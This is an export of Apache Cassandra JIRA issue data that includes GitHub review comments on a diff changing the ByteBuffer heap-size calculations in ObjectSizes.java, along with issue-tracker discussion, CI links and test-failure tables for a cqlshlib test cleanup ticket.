+     * Amount of non-data heap memory consumed by the array of byte buffers. It sums memory consumed
+     * by the array itself and for each included byte buffer using {@link #sizeOnHeapExcludingData(ByteBuffer)}.
+     */
     public static long sizeOnHeapExcludingData(ByteBuffer[] array)
     {
-        return BUFFER_EMPTY_SIZE * array.length + sizeOfArray(array);
+        if (array == null)
+            return 0;
+
+        long sum = sizeOfArray(array);
+        for (ByteBuffer b : array)
+            sum += sizeOnHeapExcludingData(b);
+
+        return sum;
     }
 
     /**
-     * Memory a byte buffer consumes
-     * @param buffer ByteBuffer to calculate in memory size
-     * @return Total in-memory size of the byte buffer
+     * @return heap memory consumed by the byte buffer. If it is a slice, it counts the data size, but it does not
+     * include the internal array overhead.
      */
     public static long sizeOnHeapOf(ByteBuffer buffer)
     {
+        if (buffer == null)
+            return 0;
+
         if (buffer.isDirect())
-            return BUFFER_EMPTY_SIZE;
-        // if we're only referencing a sub-portion of the ByteBuffer, don't count the array overhead (assume it's slab
-        // allocated, so amortized over all the allocations the overhead is negligible and better to undercount than over)
-        if (buffer.capacity() > buffer.remaining())
-            return buffer.remaining();
-        return BUFFER_EMPTY_SIZE + sizeOfArray(buffer.capacity(), 1);
-    }
+            return DIRECT_BUFFER_HEAP_SIZE;
 
-    public static long sizeOfEmptyHeapByteBuffer()
-    {
-        return BUFFER_EMPTY_SIZE;
+        int arrayLen = buffer.array().length;

Review comment:
       Great idea!




-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;25/Feb/22 09:17;githubbot;600","jacek-lewandowski commented on a change in pull request #1470:
URL: https://github.com/apache/cassandra/pull/1470#discussion_r814631192



##########
File path: src/java/org/apache/cassandra/utils/ObjectSizes.java
##########
@@ -96,58 +112,97 @@ private static long sizeOfArray(int length, long elementSize)
     }
 
     /**
-     * Memory a ByteBuffer array consumes.
+     * Amount of heap memory consumed by the array of byte buffers. It sums memory consumed by the array itself
+     * and for each included byte buffer using {@link #sizeOnHeapOf(ByteBuffer)}.
      */
     public static long sizeOnHeapOf(ByteBuffer[] array)
     {
-        long allElementsSize = 0;
-        for (int i = 0; i < array.length; i++)
-            if (array[i] != null)
-                allElementsSize += sizeOnHeapOf(array[i]);
+        if (array == null)
+            return 0;
 
-        return allElementsSize + sizeOfArray(array);
+        long sum = sizeOfArray(array);
+        for (ByteBuffer buffer : array)
+            sum += sizeOnHeapOf(buffer);
+
+        return sum;
     }
 
+    /**
+     * Amount of non-data heap memory consumed by the array of byte buffers. It sums memory consumed
+     * by the array itself and for each included byte buffer using {@link #sizeOnHeapExcludingData(ByteBuffer)}.
+     */
     public static long sizeOnHeapExcludingData(ByteBuffer[] array)
     {
-        return BUFFER_EMPTY_SIZE * array.length + sizeOfArray(array);
+        if (array == null)
+            return 0;
+
+        long sum = sizeOfArray(array);
+        for (ByteBuffer b : array)
+            sum += sizeOnHeapExcludingData(b);
+
+        return sum;
     }
 
     /**
-     * Memory a byte buffer consumes
-     * @param buffer ByteBuffer to calculate in memory size
-     * @return Total in-memory size of the byte buffer
+     * @return heap memory consumed by the byte buffer. If it is a slice, it counts the data size, but it does not
+     * include the internal array overhead.
      */
     public static long sizeOnHeapOf(ByteBuffer buffer)
     {
+        if (buffer == null)
+            return 0;
+
         if (buffer.isDirect())
-            return BUFFER_EMPTY_SIZE;
-        // if we're only referencing a sub-portion of the ByteBuffer, don't count the array overhead (assume it's slab
-        // allocated, so amortized over all the allocations the overhead is negligible and better to undercount than over)
-        if (buffer.capacity() > buffer.remaining())
-            return buffer.remaining();
-        return BUFFER_EMPTY_SIZE + sizeOfArray(buffer.capacity(), 1);
-    }
+            return DIRECT_BUFFER_HEAP_SIZE;
 
-    public static long sizeOfEmptyHeapByteBuffer()
-    {
-        return BUFFER_EMPTY_SIZE;
+        int arrayLen = buffer.array().length;

Review comment:
       thanks




-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;25/Feb/22 09:58;githubbot;600","adelapena commented on a change in pull request #1470:
URL: https://github.com/apache/cassandra/pull/1470#discussion_r818614917



##########
File path: src/java/org/apache/cassandra/utils/ObjectSizes.java
##########
@@ -96,58 +112,97 @@ private static long sizeOfArray(int length, long elementSize)
     }
 
     /**
-     * Memory a ByteBuffer array consumes.
+     * Amount of heap memory consumed by the array of byte buffers. It sums memory consumed by the array itself
+     * and for each included byte buffer using {@link #sizeOnHeapOf(ByteBuffer)}.
      */
     public static long sizeOnHeapOf(ByteBuffer[] array)
     {
-        long allElementsSize = 0;
-        for (int i = 0; i < array.length; i++)
-            if (array[i] != null)
-                allElementsSize += sizeOnHeapOf(array[i]);
+        if (array == null)
+            return 0;
 
-        return allElementsSize + sizeOfArray(array);
+        long sum = sizeOfArray(array);
+        for (ByteBuffer buffer : array)
+            sum += sizeOnHeapOf(buffer);
+
+        return sum;
     }
 
+    /**
+     * Amount of non-data heap memory consumed by the array of byte buffers. It sums memory consumed
+     * by the array itself and for each included byte buffer using {@link #sizeOnHeapExcludingData(ByteBuffer)}.
+     */
     public static long sizeOnHeapExcludingData(ByteBuffer[] array)
     {
-        return BUFFER_EMPTY_SIZE * array.length + sizeOfArray(array);
+        if (array == null)
+            return 0;
+
+        long sum = sizeOfArray(array);
+        for (ByteBuffer b : array)
+            sum += sizeOnHeapExcludingData(b);
+
+        return sum;
     }
 
     /**
-     * Memory a byte buffer consumes
-     * @param buffer ByteBuffer to calculate in memory size
-     * @return Total in-memory size of the byte buffer
+     * @return heap memory consumed by the byte buffer. If it is a slice, it counts the data size, but it does not
+     * include the internal array overhead.
      */
     public static long sizeOnHeapOf(ByteBuffer buffer)
     {
+        if (buffer == null)
+            return 0;
+
         if (buffer.isDirect())
-            return BUFFER_EMPTY_SIZE;
-        // if we're only referencing a sub-portion of the ByteBuffer, don't count the array overhead (assume it's slab
-        // allocated, so amortized over all the allocations the overhead is negligible and better to undercount than over)
-        if (buffer.capacity() > buffer.remaining())
-            return buffer.remaining();
-        return BUFFER_EMPTY_SIZE + sizeOfArray(buffer.capacity(), 1);
-    }
+            return DIRECT_BUFFER_HEAP_SIZE;
 
-    public static long sizeOfEmptyHeapByteBuffer()
-    {
-        return BUFFER_EMPTY_SIZE;
+        int arrayLen = buffer.array().length;
+        int bufLen = buffer.remaining();
+
+        // if we're only referencing a sub-portion of the ByteBuffer, don't count the array overhead (assume it is SLAB
+        // allocated - the overhead amortized over all the allocations is negligible and better to undercount than over)
+        if (arrayLen > bufLen)
+            return EMPTY_HEAP_BUFFER_SIZE + bufLen;
+
+        return EMPTY_HEAP_BUFFER_SIZE + (arrayLen == 0 ? EMPTY_BYTE_ARRAY_SIZE : sizeOfArray(arrayLen, 1));
     }
 
-    public static long sizeOfEmptyByteArray()
+    /**
+     * @return non-data heap memory consumed by the byte buffer. If it is a slice, it does not include the internal
+     * array overhead.
+     */
+    public static long sizeOnHeapExcludingData(ByteBuffer buffer)
     {
-        return BYTE_ARRAY_EMPTY_SIZE;
+        if (buffer == null)
+            return 0;
+
+        if (buffer.isDirect())
+            return DIRECT_BUFFER_HEAP_SIZE;
+
+        int arrayLen = buffer.array().length;
+        int bufLen = buffer.remaining();
+
+        // if we're only referencing a sub-portion of the ByteBuffer, don't count the array overhead (assume it is SLAB
+        // allocated - the overhead amortized over all the allocations is negligible and better to undercount than over)
+        if (arrayLen > bufLen)
+            return EMPTY_HEAP_BUFFER_SIZE;
+
+        // If buffers are dedicated, account for byte array size and any padding overhead
+        return EMPTY_HEAP_BUFFER_SIZE + (arrayLen == 0 ? EMPTY_BYTE_ARRAY_SIZE : (sizeOfArray(arrayLen, 1) - arrayLen));
     }
 
     /**
      * Memory a String consumes
+     *
      * @param str String to calculate memory size of
      * @return Total in-memory size of the String
      */
-    //@TODO hard coding this to 2 isn't necessarily correct in Java 11
+    // TODO hard coding this to 2 isn't necessarily correct in Java 11

Review comment:
       Is this TODO comment still valid?




-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;03/Mar/22 12:38;githubbot;600","jacek-lewandowski commented on a change in pull request #1470:
URL: https://github.com/apache/cassandra/pull/1470#discussion_r818660517



##########
File path: src/java/org/apache/cassandra/utils/ObjectSizes.java
##########
@@ -96,58 +112,97 @@ private static long sizeOfArray(int length, long elementSize)
     }
 
     /**
-     * Memory a ByteBuffer array consumes.
+     * Amount of heap memory consumed by the array of byte buffers. It sums memory consumed by the array itself
+     * and for each included byte buffer using {@link #sizeOnHeapOf(ByteBuffer)}.
      */
     public static long sizeOnHeapOf(ByteBuffer[] array)
     {
-        long allElementsSize = 0;
-        for (int i = 0; i < array.length; i++)
-            if (array[i] != null)
-                allElementsSize += sizeOnHeapOf(array[i]);
+        if (array == null)
+            return 0;
 
-        return allElementsSize + sizeOfArray(array);
+        long sum = sizeOfArray(array);
+        for (ByteBuffer buffer : array)
+            sum += sizeOnHeapOf(buffer);
+
+        return sum;
     }
 
+    /**
+     * Amount of non-data heap memory consumed by the array of byte buffers. It sums memory consumed
+     * by the array itself and for each included byte buffer using {@link #sizeOnHeapExcludingData(ByteBuffer)}.
+     */
     public static long sizeOnHeapExcludingData(ByteBuffer[] array)
     {
-        return BUFFER_EMPTY_SIZE * array.length + sizeOfArray(array);
+        if (array == null)
+            return 0;
+
+        long sum = sizeOfArray(array);
+        for (ByteBuffer b : array)
+            sum += sizeOnHeapExcludingData(b);
+
+        return sum;
     }
 
     /**
-     * Memory a byte buffer consumes
-     * @param buffer ByteBuffer to calculate in memory size
-     * @return Total in-memory size of the byte buffer
+     * @return heap memory consumed by the byte buffer. If it is a slice, it counts the data size, but it does not
+     * include the internal array overhead.
      */
     public static long sizeOnHeapOf(ByteBuffer buffer)
     {
+        if (buffer == null)
+            return 0;
+
         if (buffer.isDirect())
-            return BUFFER_EMPTY_SIZE;
-        // if we're only referencing a sub-portion of the ByteBuffer, don't count the array overhead (assume it's slab
-        // allocated, so amortized over all the allocations the overhead is negligible and better to undercount than over)
-        if (buffer.capacity() > buffer.remaining())
-            return buffer.remaining();
-        return BUFFER_EMPTY_SIZE + sizeOfArray(buffer.capacity(), 1);
-    }
+            return DIRECT_BUFFER_HEAP_SIZE;
 
-    public static long sizeOfEmptyHeapByteBuffer()
-    {
-        return BUFFER_EMPTY_SIZE;
+        int arrayLen = buffer.array().length;
+        int bufLen = buffer.remaining();
+
+        // if we're only referencing a sub-portion of the ByteBuffer, don't count the array overhead (assume it is SLAB
+        // allocated - the overhead amortized over all the allocations is negligible and better to undercount than over)
+        if (arrayLen > bufLen)
+            return EMPTY_HEAP_BUFFER_SIZE + bufLen;
+
+        return EMPTY_HEAP_BUFFER_SIZE + (arrayLen == 0 ? EMPTY_BYTE_ARRAY_SIZE : sizeOfArray(arrayLen, 1));
     }
 
-    public static long sizeOfEmptyByteArray()
+    /**
+     * @return non-data heap memory consumed by the byte buffer. If it is a slice, it does not include the internal
+     * array overhead.
+     */
+    public static long sizeOnHeapExcludingData(ByteBuffer buffer)
     {
-        return BYTE_ARRAY_EMPTY_SIZE;
+        if (buffer == null)
+            return 0;
+
+        if (buffer.isDirect())
+            return DIRECT_BUFFER_HEAP_SIZE;
+
+        int arrayLen = buffer.array().length;
+        int bufLen = buffer.remaining();
+
+        // if we're only referencing a sub-portion of the ByteBuffer, don't count the array overhead (assume it is SLAB
+        // allocated - the overhead amortized over all the allocations is negligible and better to undercount than over)
+        if (arrayLen > bufLen)
+            return EMPTY_HEAP_BUFFER_SIZE;
+
+        // If buffers are dedicated, account for byte array size and any padding overhead
+        return EMPTY_HEAP_BUFFER_SIZE + (arrayLen == 0 ? EMPTY_BYTE_ARRAY_SIZE : (sizeOfArray(arrayLen, 1) - arrayLen));
     }
 
     /**
      * Memory a String consumes
+     *
      * @param str String to calculate memory size of
      * @return Total in-memory size of the String
      */
-    //@TODO hard coding this to 2 isn't necessarily correct in Java 11
+    // TODO hard coding this to 2 isn't necessarily correct in Java 11

Review comment:
       yes, I didn't change that logic at all




-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;03/Mar/22 13:35;githubbot;600","adelapena commented on a change in pull request #1470:
URL: https://github.com/apache/cassandra/pull/1470#discussion_r818713324



##########
File path: src/java/org/apache/cassandra/utils/ObjectSizes.java
##########
@@ -96,58 +112,97 @@ private static long sizeOfArray(int length, long elementSize)
     }
 
     /**
-     * Memory a ByteBuffer array consumes.
+     * Amount of heap memory consumed by the array of byte buffers. It sums memory consumed by the array itself
+     * and for each included byte buffer using {@link #sizeOnHeapOf(ByteBuffer)}.
      */
     public static long sizeOnHeapOf(ByteBuffer[] array)
     {
-        long allElementsSize = 0;
-        for (int i = 0; i < array.length; i++)
-            if (array[i] != null)
-                allElementsSize += sizeOnHeapOf(array[i]);
+        if (array == null)
+            return 0;
 
-        return allElementsSize + sizeOfArray(array);
+        long sum = sizeOfArray(array);
+        for (ByteBuffer buffer : array)
+            sum += sizeOnHeapOf(buffer);
+
+        return sum;
     }
 
+    /**
+     * Amount of non-data heap memory consumed by the array of byte buffers. It sums memory consumed
+     * by the array itself and for each included byte buffer using {@link #sizeOnHeapExcludingData(ByteBuffer)}.
+     */
     public static long sizeOnHeapExcludingData(ByteBuffer[] array)
     {
-        return BUFFER_EMPTY_SIZE * array.length + sizeOfArray(array);
+        if (array == null)
+            return 0;
+
+        long sum = sizeOfArray(array);
+        for (ByteBuffer b : array)
+            sum += sizeOnHeapExcludingData(b);
+
+        return sum;
     }
 
     /**
-     * Memory a byte buffer consumes
-     * @param buffer ByteBuffer to calculate in memory size
-     * @return Total in-memory size of the byte buffer
+     * @return heap memory consumed by the byte buffer. If it is a slice, it counts the data size, but it does not
+     * include the internal array overhead.
      */
     public static long sizeOnHeapOf(ByteBuffer buffer)
     {
+        if (buffer == null)
+            return 0;
+
         if (buffer.isDirect())
-            return BUFFER_EMPTY_SIZE;
-        // if we're only referencing a sub-portion of the ByteBuffer, don't count the array overhead (assume it's slab
-        // allocated, so amortized over all the allocations the overhead is negligible and better to undercount than over)
-        if (buffer.capacity() > buffer.remaining())
-            return buffer.remaining();
-        return BUFFER_EMPTY_SIZE + sizeOfArray(buffer.capacity(), 1);
-    }
+            return DIRECT_BUFFER_HEAP_SIZE;
 
-    public static long sizeOfEmptyHeapByteBuffer()
-    {
-        return BUFFER_EMPTY_SIZE;
+        int arrayLen = buffer.array().length;
+        int bufLen = buffer.remaining();
+
+        // if we're only referencing a sub-portion of the ByteBuffer, don't count the array overhead (assume it is SLAB
+        // allocated - the overhead amortized over all the allocations is negligible and better to undercount than over)
+        if (arrayLen > bufLen)
+            return EMPTY_HEAP_BUFFER_SIZE + bufLen;
+
+        return EMPTY_HEAP_BUFFER_SIZE + (arrayLen == 0 ? EMPTY_BYTE_ARRAY_SIZE : sizeOfArray(arrayLen, 1));
     }
 
-    public static long sizeOfEmptyByteArray()
+    /**
+     * @return non-data heap memory consumed by the byte buffer. If it is a slice, it does not include the internal
+     * array overhead.
+     */
+    public static long sizeOnHeapExcludingData(ByteBuffer buffer)
     {
-        return BYTE_ARRAY_EMPTY_SIZE;
+        if (buffer == null)
+            return 0;
+
+        if (buffer.isDirect())
+            return DIRECT_BUFFER_HEAP_SIZE;
+
+        int arrayLen = buffer.array().length;
+        int bufLen = buffer.remaining();
+
+        // if we're only referencing a sub-portion of the ByteBuffer, don't count the array overhead (assume it is SLAB
+        // allocated - the overhead amortized over all the allocations is negligible and better to undercount than over)
+        if (arrayLen > bufLen)
+            return EMPTY_HEAP_BUFFER_SIZE;
+
+        // If buffers are dedicated, account for byte array size and any padding overhead
+        return EMPTY_HEAP_BUFFER_SIZE + (arrayLen == 0 ? EMPTY_BYTE_ARRAY_SIZE : (sizeOfArray(arrayLen, 1) - arrayLen));
     }
 
     /**
      * Memory a String consumes
+     *
      * @param str String to calculate memory size of
      * @return Total in-memory size of the String
      */
-    //@TODO hard coding this to 2 isn't necessarily correct in Java 11
+    // TODO hard coding this to 2 isn't necessarily correct in Java 11

Review comment:
       Well, the comment is mentioning the hardcoded ""2"" value, I understand that meaning the 2 bytes that were passed to `MemoryLayoutSpecification.sizeOfArray`. However, this has changed to send `Character.SIZE`, which has a value of 16 bits. So we are calling `sizeOfArray` with the size of a char in bits, when it expects bytes. I guess we should change it to `Character.BYTES`.




-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;03/Mar/22 14:32;githubbot;600","adelapena commented on a change in pull request #1470:
URL: https://github.com/apache/cassandra/pull/1470#discussion_r820672794



##########
File path: test/unit/org/apache/cassandra/db/CellSpecTest.java
##########
@@ -39,6 +39,7 @@
 import org.apache.cassandra.db.rows.NativeCell;
 import org.apache.cassandra.schema.ColumnMetadata;
 import org.apache.cassandra.schema.TableMetadata;
+import org.apache.cassandra.utils.ByteBufferUtil;

Review comment:
       Nit: unused




-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;07/Mar/22 12:49;githubbot;600","adelapena commented on a change in pull request #1470:
URL: https://github.com/apache/cassandra/pull/1470#discussion_r820672794



##########
File path: test/unit/org/apache/cassandra/db/CellSpecTest.java
##########
@@ -39,6 +39,7 @@
 import org.apache.cassandra.db.rows.NativeCell;
 import org.apache.cassandra.schema.ColumnMetadata;
 import org.apache.cassandra.schema.TableMetadata;
+import org.apache.cassandra.utils.ByteBufferUtil;

Review comment:
       Nit: unused, can be fixed on commit




-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;07/Mar/22 13:00;githubbot;600","smiklosovic closed pull request #1479:
URL: https://github.com/apache/cassandra/pull/1479


   


-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;16/Mar/22 07:26;githubbot;600","smiklosovic closed pull request #1470:
URL: https://github.com/apache/cassandra/pull/1470


   


-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;16/Mar/22 07:27;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,5400,,,0,5400,,,,,,,,,,,,,,,CASSANDRA-16900,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,jlewandowski,,,,,,,,,,,,,,Correctness,,,,,,,,Low Hanging Fruit,Code Inspection,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Mon Mar 07 16:39:48 UTC 2022,,,barnie,,,,All,,,,"0|z0zwio:",9223372036854775807,,,,adelapena,blambov,,,Normal,,4.0.2,,https://github.com/apache/cassandra/commit/a690f339ab0f2b98c69621ca5a0bad10ae9a7919,,,,,,,,,The the regression and new tests,,,,,"24/Feb/22 21:33;jlewandowski;https://github.com/apache/cassandra/pull/1470;;;","25/Feb/22 10:02;jlewandowski;Tests are running...;;;","01/Mar/22 11:59;adelapena;[~jlewandowski] do you have CI results for this?;;;","03/Mar/22 04:37;jlewandowski;[~adelapena] yes, sorry for not pasting
[j8|https://app.circleci.com/pipelines/github/jacek-lewandowski/cassandra/181/workflows/5c75c903-9c0f-473a-ad31-7325f23af85d]
[j11|https://app.circleci.com/pipelines/github/jacek-lewandowski/cassandra/181/workflows/e4f860aa-d866-4776-b8c0-d3fe2df2db78]
;;;","03/Mar/22 05:54;jlewandowski;[~adelapena] I think the tests looks ok - the failed jvm-dtests are flaky (I've checked locally, they work), the dtest failure is due to the fact that fix from CASSANDRA-16349 is not in my branch yet - can this be merged ?;;;","03/Mar/22 12:54;adelapena;[~jlewandowski] it looks good, could you please prepare a PR for trunk? There could be some divergence there due to CASSANDRA-16896.;;;","03/Mar/22 18:22;jlewandowski;Thanks [~adelapena], I've applied your comment and created trunk PR, also started CI.
https://app.circleci.com/pipelines/github/jacek-lewandowski/cassandra/184/workflows/9250c6e7-fb12-420b-b2c2-867f3fbe2ef3
https://app.circleci.com/pipelines/github/jacek-lewandowski/cassandra/184/workflows/354e0996-9070-43f7-8e08-fa8720725c9a
https://github.com/apache/cassandra/pull/1479/files;;;","07/Mar/22 12:53;adelapena;The PR for trunk looks good to me. It seems that the CI runs are hitting the problems with testing introduced by CASSANDRA-15234. Here are CI runs pointed to the patched version of CCM that fixes those problems:
||PR||CI||
|[4.0|https://github.com/apache/cassandra/pull/1470]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1337/workflows/7981ee8d-4333-48cc-84f2-24d2bcd1bbac] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/1337/workflows/3fe9d278-b542-41a2-b3b3-f6c77b859504]|
|[trunk|https://github.com/apache/cassandra/pull/1479]|[j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1338/workflows/56624bc7-f88c-4d1f-90d0-3f11b32cc02c] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/1338/workflows/3cfbfd82-6328-4a57-9821-783e872919d0]|

The CI runs above also include some repeated runs of {{{}ObjectSizesTest{}}}.;;;","07/Mar/22 13:59;adelapena;CI results look good to me, all failures [are known|https://butler.cassandra.apache.org/#/], +1.

I think we are ready to commit, unless [~blambov] has anything else to add.;;;","07/Mar/22 14:28;blambov;The patch looks good to me.;;;","07/Mar/22 16:35;adelapena;Great, thanks. Committed to 4.0 as [a690f339ab0f2b98c69621ca5a0bad10ae9a7919|https://github.com/apache/cassandra/commit/a690f339ab0f2b98c69621ca5a0bad10ae9a7919] and merged to [trunk|https://github.com/apache/cassandra/commit/0d8126dd143898588f4efcdc40b8e2bb10597185].;;;","07/Mar/22 16:39;jlewandowski;Thank you [~adelapena] !;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
cleanup cqlshlib unit test failures and warnings,CASSANDRA-17397,13429419,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,bschoeni,bschoeni,bschoeni,19/Feb/22 02:12,27/May/22 19:25,13/Jul/23 08:40,09/Mar/22 16:16,4.1,4.1-alpha1,,,,,CQL/Interpreter,,,,0,,"The cqlshlib unit tests have some regular failures and warnings.
 # test_copyutil.py fails with too many open files when ulimit is 256
 # cassconnect.py:39: DeprecationWarning: Legacy execution parameters
 # sslhandling.py:42: DeprecationWarning: The SafeConfigParser class has been renamed to ConfigParser 
 # remove unused reference to nosetests.xml in Jenkinsfile

 

The cqlshlib test test_copyutil.py fails on MacOS with 

*E           OSError: [Errno 24] Too many open files*

This happens because the test does not close the file descriptors after use.  The default ulimit on MacOS is small, 256:

     % ulimit -n

     256

The simple fix is to close the pipe after use.  Increasing ulimit nofiles works also, but shouldn't be necessary.",,bschoeni,jmckenzie,smiklosovic,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,bschoeni,,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Mon Mar 14 18:25:25 UTC 2022,,,,,,,All,,,,"0|z0zqjk:",9223372036854775807,,,,brandon.williams,smiklosovic,,,Normal,,NA,,https://github.com/apache/cassandra/commit/c408931aa262353845c926f367ad06d27d9f164e,,,,,,,,,run CI,,,,,"02/Mar/22 02:49;bschoeni;[~brandon.williams] could you review status here, I can't seem to progress it to patch available;;;","02/Mar/22 13:19;brandon.williams;If a ticket isn't triaged (caught me on vacation) to the open state, that has to be done before you can set it PA.  I've gone ahead and done this.;;;","02/Mar/22 17:05;brandon.williams;-[~bschoeni] actually...where is the patch? Heh, maybe it was in a field that got reset when I opened the ticket?-

Nevermind, I'm not sure what happened but I found where Stefan linked it in the work log, and linked it again.;;;","02/Mar/22 19:24;smiklosovic;[https://github.com/apache/cassandra/pull/1475]

[https://ci-cassandra.apache.org/job/Cassandra-devbranch/1467]

+1 from me;;;","02/Mar/22 19:37;brandon.williams;Looks good to me too.  bulkLoaderSuccessfullyStreamsOverSsl is a new test that failed but is unrelated from another new commit and I ninja-fixed it.

+1;;;","09/Mar/22 16:00;smiklosovic;We removed nosetests.xml by accident, PR to fix it is here:
https://github.com/apache/cassandra/pull/1486;;;","09/Mar/22 16:00;smiklosovic;https://github.com/apache/cassandra/pull/1486;;;","09/Mar/22 16:16;smiklosovic;fix commited here https://github.com/apache/cassandra/commit/852d7b667d28e5dbd7f20a3a16234b30da07ff56;;;","14/Mar/22 18:18;jmckenzie;We jumped from 3 failures to 17 on this CI run (transition from #999 to #1000). This may have correlated w/a regression in our CI env, or may be reflective of some changes in this ticket. Not sure - though it's worth calling out we had the subsequent three builds fail on ASF infra immediately after the one this SHA triggered, so. Probably worth a skim of the failures below to see if any might be related to the work here. 

 

[CI Results]
Branch: trunk, build number: 1000
jenkins url: [https://ci-cassandra.apache.org/job/Cassandra-trunk/1000/]
JIRA: CASSANDRA-17397
commit url: [https://git-wip-us.apache.org/repos/asf?p=cassandra.git;a=commit;h=852d7b667d28e5dbd7f20a3a16234b30da07ff56]
affected paths:
 * .jenkins/Jenkinsfile

Build Result: UNSTABLE
Passing Tests: 43616
Failing Tests: 17
||Test|Failures|JIRA|
|dtest-upgrade.upgrade_tests.upgrade_through_versions_test.TestProtoV3Upgrade_AllVersions_EndsAt_3_11_X.test_rolling_upgrade_with_internode_ssl|24 of 59|CASSANDRA-17306?|
|dtest-upgrade.upgrade_tests.upgrade_through_versions_test.TestProtoV3Upgrade_AllVersions_RandomPartitioner_EndsAt_3_11_X_HEAD.test_rolling_upgrade|25 of 59|CASSANDRA-17306?|
|org.apache.cassandra.cql3.ViewFilteringComplexPKTest.testPartitionKeyAndClusteringKeyFilteringRestrictions[2]|1 of 59|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|org.apache.cassandra.db.commitlog.BatchCommitLogTest.testOutOfOrderFlushRecoveryWithCompaction[3]-cdc|2 of 59|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|org.apache.cassandra.cql3.ViewComplexUpdatesTest.testUpdateColumnNotInViewWithFlush[1]|1 of 59|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|dtest.cqlsh_tests.test_cqlsh_copy.TestCqlshCopy.test_bulk_round_trip_with_timeouts|1 of 59|CASSANDRA-17322?|
|org.apache.cassandra.distributed.test.ring.AutoBootstrapTest.readWriteDuringBootstrapTest|8 of 59|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|org.apache.cassandra.cql3.ViewFilteringComplexPKTest.testPartitionKeyAndClusteringKeyFilteringRestrictions[3]|1 of 59|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|org.apache.cassandra.cql3.validation.operations.CompactStorageTest.testIndicesOnCompactTable|2 of 59|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|dtest-upgrade.upgrade_tests.upgrade_through_versions_test.TestProtoV3Upgrade_AllVersions_RandomPartitioner_EndsAt_3_11_X_HEAD.test_rolling_upgrade_with_internode_ssl|24 of 59|CASSANDRA-17306?|
|org.apache.cassandra.cql3.validation.entities.TupleTypeTest.unknown|1 of 59|[No JIRA found|https://issues.apache.org/jira/secure/RapidBoard.jspa?rapidView=496&quickFilter=2252]|
|org.apache.cassandra.net.ProxyHandlerConnectionsTest.testExpireSome-compression|4 of 59|CASSANDRA-17301?|
|dtest-upgrade.upgrade_tests.upgrade_through_versions_test.TestProtoV3Upgrade_AllVersions_EndsAt_3_11_X.test_rolling_upgrade|25 of 59|CASSANDRA-17306?|
|org.apache.cassandra.db.commitlog.CommitLogSegmentManagerCDCTest.testSegmentFlaggingWithNonblockingOnCreation|2 of 59|CASSANDRA-17416?|
